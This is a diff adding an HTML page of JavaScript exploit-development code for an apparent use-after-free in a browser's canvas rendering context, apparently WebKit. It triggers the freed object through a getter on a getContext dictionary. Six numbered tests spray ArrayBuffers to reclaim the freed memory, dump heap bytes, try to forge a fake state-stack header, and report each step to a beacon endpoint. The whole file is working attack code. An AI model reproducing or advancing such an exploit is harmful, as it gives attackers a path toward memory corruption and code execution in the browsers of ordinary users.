@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V553</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V553-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V553-targeted-ops');
+
+// T1: UAF + AB spray + check AB contents (are they zero = reclaim proof?)
+(function T1(){
+  b('T1-START','ab-contents-check');
+  var ctx=triggerUAF();
+  b('T1-UAF','ok');
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T1-SPRAY','50 ABs');
+  // Check if any AB has non-zero content (would mean it didn't reclaim the freed slot)
+  var found=-1;
+  for(var i=0;i<abs.length;i++){
+    var dv=new DataView(abs[i]);
+    var sum=0;
+    for(var j=0;j<768;j+=8) sum+=dv.getFloat64(j,true);
+    if(sum!==0){found=i;break}
+  }
+  // Also dump first 128 bytes of AB[0] and AB[49]
+  var hex0='';
+  var dv0=new DataView(abs[0]);
+  for(var j=0;j<128;j++){
+    var v=dv0.getUint8(j);
+    hex0+=(v<16?'0':'')+v.toString(16);
+  }
+  b('T1-AB0',hex0);
+  var hex49='';
+  var dv49=new DataView(abs[49]);
+  for(var j=0;j<128;j++){
+    var v=dv49.getUint8(j);
+    hex49+=(v<16?'0':'')+v.toString(16);
+  }
+  b('T1-AB49',hex49);
+  b('T1-FOUND','nonzero_ab='+found);
+  b('T1-DONE','ok');
+})();
+
+// T2: UAF + AB spray + lineWidth getter (accesses state().lineWidth via m_stateStack.last())
+// Expected: CRASH because m_stateStack zeroed → buffer=0, size=0, .last() → buffer[-1] → segfault
+(function T2(){
+  b('T2-START','lineWidth-read');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T2-SPRAY','done');
+  b('T2-PRELW','about to read lineWidth');
+  try{
+    var lw=ctx.lineWidth;
+    b('T2-LW','lineWidth='+lw);
+  }catch(e){b('T2-LW-ERR',e.message)}
+  b('T2-DONE','ok');
+})();
+
+// T3: UAF + AB spray + try to just READ typeof and constructor AFTER previous crash test
+// If T2 crashed, this won't run. But if lineWidth somehow works...
+(function T3(){
+  b('T3-START','save-only');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T3-SPRAY','done');
+  b('T3-PRESAVE','about to save');
+  try{
+    ctx.save();
+    b('T3-SAVE','save() OK!');
+  }catch(e){b('T3-SAVE-ERR',e.message)}
+  b('T3-DONE','ok');
+})();
+
+// T4: UAF + NO spray + save() — freed memory without reclaim
+(function T4(){
+  b('T4-START','save-no-spray');
+  var ctx=triggerUAF();
+  // NO AB spray — freed memory has bmalloc internals
+  b('T4-PRESAVE','about to save on freed memory (no reclaim)');
+  try{
+    ctx.save();
+    b('T4-SAVE','save() on freed OK!');
+  }catch(e){b('T4-SAVE-ERR',e.message)}
+  b('T4-DONE','ok');
+})();
+
+// T5: UAF + AB spray, then FILL one AB with a fake stateStack before calling lineWidth
+// This tests: if we control the stateStack Vector header, can we survive lineWidth access?
+// Vector<State,1>: buffer_ptr(8) + size(4) + capacity(4) = 16 bytes
+// We'll make a fake stateStack that points to a known buffer
+(function T5(){
+  b('T5-START','fake-statestack');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T5-SPRAY','done');
+
+  // We need to know the offset of m_stateStack within the object
+  // From earlier analysis: CanvasRenderingContext base is ~48 bytes,
+  // then CanvasPath (vtable + m_path), then m_stateStack
+  // Let's try scanning: write a marker at each 8-byte offset in one AB
+  // and see if save() works or if the crash location changes
+
+  // For now, just try save() with modified AB content
+  // Pick AB[25] as the likely reclaim target (middle of spray)
+  var dv=new DataView(abs[25]);
+  // Write 0x01 at every 4-byte boundary to see if any offset matters for save()
+  for(var i=0;i<768;i+=4) dv.setUint32(i,1,true);
+  b('T5-FILLED','AB[25] filled with 1s');
+  b('T5-PRESAVE','about to save');
+  try{
+    ctx.save();
+    b('T5-SAVE','save() OK with filled AB!');
+  }catch(e){b('T5-SAVE-ERR',e.message)}
+  b('T5-DONE','ok');
+})();
+
+// T6: UAF + AB spray where ALL ABs are filled with safe values
+(function T6(){
+  b('T6-START','all-abs-filled');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // Fill entire buffer with 0x01 at every byte
+    for(var j=0;j<768;j++) dv.setUint8(j,1);
+    abs.push(ab);
+  }
+  b('T6-SPRAY','50 filled ABs');
+  b('T6-PRESAVE','about to save');
+  try{
+    ctx.save();
+    b('T6-SAVE','save() OK!');
+  }catch(e){b('T6-SAVE-ERR',e.message)}
+  b('T6-DONE','ok');
+})();
+
+b('DONE','V553-all-complete');
+</script>
+</body></html>
